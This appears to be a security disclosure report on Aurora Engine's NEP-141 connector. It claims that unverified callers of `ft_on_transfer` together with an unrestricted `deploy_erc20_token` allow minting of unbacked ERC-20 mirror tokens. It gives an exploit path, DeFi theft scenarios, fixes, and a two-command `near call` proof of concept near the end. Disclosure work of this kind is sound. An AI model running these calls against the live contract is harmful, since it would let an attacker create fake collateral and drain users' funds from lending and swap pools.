### Title
Unbacked ERC-20 Token Minting via Unverified `ft_on_transfer` Caller — (File: `engine/src/contract_methods/connector.rs`)

### Summary

The `ft_on_transfer` function in Aurora Engine does not verify that the caller is a legitimate NEP-141 token contract that has actually transferred tokens. Combined with the unrestricted `deploy_erc20_token` function, any unprivileged NEAR account can register itself as a NEP-141 token and then directly invoke `ft_on_transfer` to mint unbacked ERC-20 mirror tokens on Aurora without transferring any real underlying assets.

### Finding Description

**Root cause — missing caller verification in `ft_on_transfer`:**

`ft_on_transfer` is the NEP-141 receiver callback. Under the NEP-141 standard, it is supposed to be called exclusively by a token contract *after* a successful `ft_transfer_call` that has already moved tokens into Aurora's custody. Aurora's implementation contains no such guard:

```rust
// engine/src/contract_methods/connector.rs  lines 62-109
pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let predecessor_account_id = env.predecessor_account_id();
        ...
        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)          // mints ETH
        } else {
            engine.receive_erc20_tokens(               // mints ERC-20 mirror tokens
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };
``` [1](#0-0) 

The only distinction made is whether `predecessor_account_id` equals the stored connector account. Any other NEAR account falls into the `else` branch, which calls `receive_erc20_tokens` using the caller's account ID as the NEP-141 token identifier and `args.amount` as the amount to credit — with no verification that any tokens were actually transferred.

**Enabling condition — unrestricted `deploy_erc20_token`:**

`deploy_erc20_token` carries no caller restriction. Any NEAR account can register any account ID as a NEP-141 token and obtain an ERC-20 mirror address on Aurora:

```rust
// engine/src/contract_methods/connector.rs  lines 112-158
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes)...;
        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;
``` [2](#0-1) 

The `Legacy` variant does not call `ft_metadata` or any liveness check on the NEP-141 account, so the attacker's own NEAR account qualifies.

**End-to-end exploit path:**

1. Attacker controls NEAR account `attacker.near`.
2. Attacker calls `deploy_erc20_token` (Legacy) on Aurora with `attacker.near` as the NEP-141 token. Aurora stores the mapping `attacker.near → ERC-20 address 0xABC…`.
3. Attacker directly calls `ft_on_transfer` on Aurora with JSON args `{"sender_id":"attacker.near","amount":"1000000000000000000","msg":"<attacker_evm_address>"}`.
4. `predecessor_account_id` is `attacker.near` (set by the NEAR runtime, not spoofable). It does not equal the connector account, so `receive_erc20_tokens` is invoked.
5. `receive_erc20_tokens` looks up the ERC-20 for `attacker.near`, finds `0xABC…`, and mints `1000000000000000000` tokens to the attacker's EVM address — with zero NEP-141 tokens ever transferred to Aurora.
6. The function returns `"0"` (tokens accepted), but there is no token contract to enforce a refund, so the return value is irrelevant.

The attacker now holds an arbitrary quantity of ERC-20 mirror tokens that are entirely unbacked.

### Impact Explanation

**ERC-20 mirror accounting bug → potential direct theft of user funds (Critical).**

The minted ERC-20 tokens are indistinguishable on-chain from legitimately bridged tokens of the same NEP-141 type. Any Aurora DeFi protocol (AMM, lending market, yield aggregator) that accepts the ERC-20 address `0xABC…` as collateral or as a swap asset will treat the attacker's unbacked tokens as real. The attacker can:

- Supply unbacked tokens as collateral and borrow real assets (ETH, USDC ERC-20 mirrors, etc.) from a lending protocol, draining the protocol's reserves.
- Swap unbacked tokens for real tokens in an AMM pool, draining liquidity providers.

Because the exit precompile calls `ft_transfer` on the NEP-141 contract, the attacker cannot directly redeem the fake tokens for real NEP-141 assets through Aurora's own bridge. However, the theft occurs at the DeFi layer, which is the realistic production impact.

### Likelihood Explanation

**High.** The attack requires:
- One NEAR account (no minimum balance beyond gas).
- Two public, unrestricted contract calls (`deploy_erc20_token`, then `ft_on_transfer`).
- No privileged keys, no governance capture, no oracle manipulation.

Any unprivileged user can execute this atomically.

### Recommendation

1. **Add caller verification in `ft_on_transfer`**: maintain an allowlist of registered NEP-141 token account IDs (populated by `deploy_erc20_token`) and reject any `ft_on_transfer` call whose `predecessor_account_id` is not in that list. Since the mapping already exists in storage (used by `get_nep141_from_erc20`), the reverse lookup is straightforward.
2. **Restrict `deploy_erc20_token`**: require the caller to be the owner or a designated admin, or require a liveness proof (e.g., always use the `WithMetadata` path that calls `ft_metadata` on the NEP-141 contract).
3. **Alternatively**, gate `receive_erc20_tokens` on a cross-contract receipt proof that the tokens were actually transferred, analogous to how `exit_to_near_precompile_callback` uses `assert_private_call` and checks `promise_result`.

### Proof of Concept

```
# Step 1 – register attacker.near as a NEP-141 token (no restriction)
near call aurora deploy_erc20_token \
  '{"nep141": "attacker.near"}' \
  --accountId attacker.near

# Step 2 – directly invoke ft_on_transfer with fabricated amount
near call aurora ft_on_transfer \
  '{"sender_id":"attacker.near","amount":"1000000000000000000","msg":"<attacker_evm_hex_address>"}' \
  --accountId attacker.near

# Result: Aurora mints 1e18 ERC-20 mirror tokens to <attacker_evm_hex_address>
# with zero NEP-141 tokens ever deposited into Aurora's custody.
``` [3](#0-2) [4](#0-3)

### Citations

**File:** engine/src/contract_methods/connector.rs (L62-109)
```rust
pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}
```

**File:** engine/src/contract_methods/connector.rs (L112-158)
```rust
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes).map_err(|_| errors::ERR_BORSH_DESERIALIZE)?;

        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;

                io.return_output(
                    &borsh::to_vec(address.as_bytes()).map_err(|_| errors::ERR_SERIALIZE)?,
                );
                Ok(PromiseOrValue::Value(address))
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                let args = borsh::to_vec(&nep141).map_err(|_| errors::ERR_SERIALIZE)?;
                let base = PromiseCreateArgs {
                    target_account_id: nep141,
                    method: "ft_metadata".to_string(),
                    args: vec![],
                    attached_balance: ZERO_YOCTO,
                    attached_gas: READ_PROMISE_ATTACHED_GAS,
                };
                let callback = PromiseCreateArgs {
                    target_account_id: env.current_account_id(),
                    method: "deploy_erc20_token_callback".to_string(),
                    args,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: DEPLOY_ERC20_TOKEN_CALLBACK_ATTACHED_GAS,
                };
                // Safe because these promises are read-only calls to the main engine contract
                // and this transaction could be executed by the owner of the contract only.
                let promise_args = PromiseWithCallbackArgs { base, callback };
                let promise_id = handler.promise_create_with_callback(&promise_args);

                handler.promise_return(promise_id);

                Ok(PromiseOrValue::Promise(promise_args))
            }
        }
    })
```
